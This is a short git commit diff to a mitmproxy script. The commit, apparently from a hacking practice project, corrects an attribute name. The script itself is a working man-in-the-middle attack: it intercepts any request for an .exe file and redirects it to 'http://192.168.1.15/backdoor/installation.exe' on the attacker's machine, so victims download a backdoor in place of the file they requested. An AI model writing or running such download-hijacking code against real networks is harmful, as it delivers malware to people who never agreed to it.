b4810f437388ebd1c68095f0e3ac02c1138ff364
By Ethical Hacker <59092167+mrhacker51@users.noreply.github.com>
2019-12-20 19:22:06 +0300

    Update mitmproxy.py

--- mitmproxy.py
+++ mitmproxy.py
@@ -1,7 +1,7 @@
 import mitmproxy
 
 def request(flow):
-	if flow.request_host != "192.168.1.15" and flow.request.pretty_url.endswith(".exe"):
+	if flow.request.host != "192.168.1.15" and flow.request.pretty_url.endswith(".exe"):
 		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/installation.exe"})
 		
 		
